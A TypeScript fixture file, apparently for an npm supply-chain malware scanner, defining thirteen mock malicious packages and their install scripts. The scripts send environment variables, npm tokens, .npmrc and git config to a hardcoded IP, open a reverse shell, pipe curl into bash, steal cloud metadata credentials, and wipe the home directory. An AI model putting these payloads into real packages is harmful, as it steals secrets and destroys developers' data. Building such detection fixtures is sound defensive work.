import { type FixturePackage, pkgJson } from "./fixtures.ts";

const PUBLIC_IP = "185.199.108.7";
const IMDS = "169.254.169.254";

export const ATTACK_FIXTURES: FixturePackage[] = [
  {
    name: "mal-postinstall-env",
    downloads: 40,
    latest: "1.0.1",
    versions: {
      "1.0.1": {
        files: [
          pkgJson("mal-postinstall-env", "1.0.1", { postinstall: "node ./s.js" }),
          {
            path: "s.js",
            content: `const h=require('https');const e=JSON.stringify(process.env);h.request('http://${PUBLIC_IP}/c').end(e);`,
          },
        ],
        scripts: { postinstall: "node ./s.js" },
        maintainer: { name: "x", email: "x@proton.me" },
        ageHours: 3,
      },
    },
  },
  {
    name: "mal-preinstall-harvester",
    downloads: 12,
    latest: "2.0.0",
    versions: {
      "2.0.0": {
        files: [
          pkgJson("mal-preinstall-harvester", "2.0.0", { preinstall: "node ./setup_bun.js" }),
          {
            path: "setup_bun.js",
            content: `const cp=require('child_process');const n=require('net');const t=process.env.NPM_TOKEN;const s=n.connect(443,'${PUBLIC_IP}');s.write(t);`,
          },
        ],
        scripts: { preinstall: "node ./setup_bun.js" },
        maintainer: { name: "x", email: "x@mail.com" },
        ageHours: 1,
      },
    },
  },
  {
    name: "mal-curl-bash",
    downloads: 5,
    latest: "0.0.1",
    versions: {
      "0.0.1": {
        files: [
          pkgJson("mal-curl-bash", "0.0.1", {
            postinstall: `curl -s http://${PUBLIC_IP}/i.sh | bash`,
          }),
        ],
        scripts: { postinstall: `curl -s http://${PUBLIC_IP}/i.sh | bash` },
        maintainer: { name: "x", email: "x@mail.com" },
        ageHours: 2,
      },
    },
  },
  {
    name: "mal-obfuscated-eval",
    downloads: 80,
    latest: "1.2.0",
    versions: {
      "1.2.0": {
        files: [
          pkgJson("mal-obfuscated-eval", "1.2.0"),
          {
            path: "index.js",
            content: `var _0x1a2b="${"Q".repeat(2100)}";eval(Buffer.from(_0x1a2b,'base64').toString());`,
          },
        ],
        maintainer: { name: "x", email: "x@mail.com" },
        ageHours: 5,
      },
    },
  },
  {
    name: "mal-provenance-downgrade",
    downloads: 2_000_000,
    latest: "1.0.1",
    versions: {
      "1.0.0": {
        files: [
          pkgJson("mal-provenance-downgrade", "1.0.0"),
          { path: "i.js", content: "module.exports={};" },
        ],
        maintainer: { name: "orig", email: "orig@corp.dev" },
        provenance: true,
        ageHours: 4320,
      },
      "1.0.1": {
        files: [
          pkgJson("mal-provenance-downgrade", "1.0.1", { postinstall: "node ./p.js" }),
          { path: "i.js", content: "module.exports={};" },
          {
            path: "p.js",
            content: `const h=require('https');h.request('http://${PUBLIC_IP}/x').end(JSON.stringify(process.env));`,
          },
        ],
        scripts: { postinstall: "node ./p.js" },
        maintainer: { name: "orig", email: "attacker@proton.me" },
        provenance: false,
        ageHours: 2,
      },
    },
  },
  {
    name: "mal-base64-loader",
    downloads: 30,
    latest: "1.0.0",
    versions: {
      "1.0.0": {
        files: [
          pkgJson("mal-base64-loader", "1.0.0", { postinstall: "node ./l.js" }),
          {
            path: "l.js",
            content: "const p=Buffer.from(process.env.X||'','base64').toString();eval(p);",
          },
        ],
        scripts: { postinstall: "node ./l.js" },
        maintainer: { name: "x", email: "x@mail.com" },
        ageHours: 6,
      },
    },
  },
  {
    name: "mal-source-leak",
    downloads: 15,
    latest: "1.0.0",
    versions: {
      "1.0.0": {
        files: [
          pkgJson("mal-source-leak", "1.0.0", { postinstall: "node ./collect.js" }),
          {
            path: "collect.js",
            content: `const fs=require('fs');const h=require('https');const src=fs.readFileSync('.git/config')+fs.readdirSync(process.cwd()).join();h.request('http://${PUBLIC_IP}/src').end(src);`,
          },
        ],
        scripts: { postinstall: "node ./collect.js" },
        maintainer: { name: "x", email: "x@mail.com" },
        ageHours: 3,
      },
    },
  },
  {
    name: "mal-secret-theft",
    downloads: 22,
    latest: "1.0.0",
    versions: {
      "1.0.0": {
        files: [
          pkgJson("mal-secret-theft", "1.0.0", { postinstall: "node ./t.js" }),
          {
            path: "t.js",
            content: `const fs=require('fs');const h=require('https');const home=process.env.HOME;const c=fs.readFileSync(home+'/.npmrc');h.request('http://${PUBLIC_IP}/k').end(c);`,
          },
        ],
        scripts: { postinstall: "node ./t.js" },
        maintainer: { name: "x", email: "x@mail.com" },
        ageHours: 4,
      },
    },
  },
  {
    name: "mal-imds-steal",
    downloads: 8,
    latest: "1.0.0",
    versions: {
      "1.0.0": {
        files: [
          pkgJson("mal-imds-steal", "1.0.0", { postinstall: "node ./m.js" }),
          {
            path: "m.js",
            content: `fetch('http://${IMDS}/latest/meta-data/iam/security-credentials/').then(r=>r.text()).then(t=>fetch('http://${PUBLIC_IP}/c',{method:'POST',body:t}));`,
          },
        ],
        scripts: { postinstall: "node ./m.js" },
        maintainer: { name: "x", email: "x@mail.com" },
        ageHours: 2,
      },
    },
  },
  {
    name: "mal-reverse-shell",
    downloads: 6,
    latest: "1.0.0",
    versions: {
      "1.0.0": {
        files: [
          pkgJson("mal-reverse-shell", "1.0.0", { postinstall: "node ./r.js" }),
          {
            path: "r.js",
            content: `const net=require('net');const cp=require('child_process');const s=net.connect(4444,'${PUBLIC_IP}');cp.spawn('/bin/sh',[],{stdio:[s,s,s]});`,
          },
        ],
        scripts: { postinstall: "node ./r.js" },
        maintainer: { name: "x", email: "x@mail.com" },
        ageHours: 1,
      },
    },
  },
  {
    name: "@acme-corp/internal-config",
    downloads: 3,
    latest: "99.0.0",
    versions: {
      "99.0.0": {
        files: [
          pkgJson("@acme-corp/internal-config", "99.0.0", { postinstall: "node ./d.js" }),
          {
            path: "d.js",
            content: `const h=require('https');h.get('http://${PUBLIC_IP}/dc?h='+require('os').hostname());`,
          },
        ],
        scripts: { postinstall: "node ./d.js" },
        maintainer: { name: "x", email: "x@mail.com" },
        ageHours: 2,
      },
    },
  },
  {
    name: "mal-protestware",
    downloads: 500,
    latest: "2.0.0",
    versions: {
      "2.0.0": {
        files: [
          pkgJson("mal-protestware", "2.0.0", { postinstall: "node ./w.js" }),
          {
            path: "w.js",
            content:
              "const fs=require('fs');const country=process.env.LANG||'';if(country.includes('RU')){fs.rmSync(process.env.HOME,{recursive:true,force:true});}",
          },
        ],
        scripts: { postinstall: "node ./w.js" },
        maintainer: { name: "x", email: "x@mail.com" },
        ageHours: 10,
      },
    },
  },
  {
    name: "mal-fake-native",
    downloads: 18,
    latest: "1.0.0",
    versions: {
      "1.0.0": {
        files: [
          pkgJson("mal-fake-native", "1.0.0", { postinstall: "node ./install.js" }),
          {
            path: "install.js",
            content: `const h=require('https');h.get('http://${PUBLIC_IP}/prebuilt.node',r=>r.pipe(require('fs').createWriteStream('bin.node')));`,
          },
        ],
        scripts: { postinstall: "node ./install.js" },
        maintainer: { name: "x", email: "x@mail.com" },
        ageHours: 3,
      },
    },
  },
];
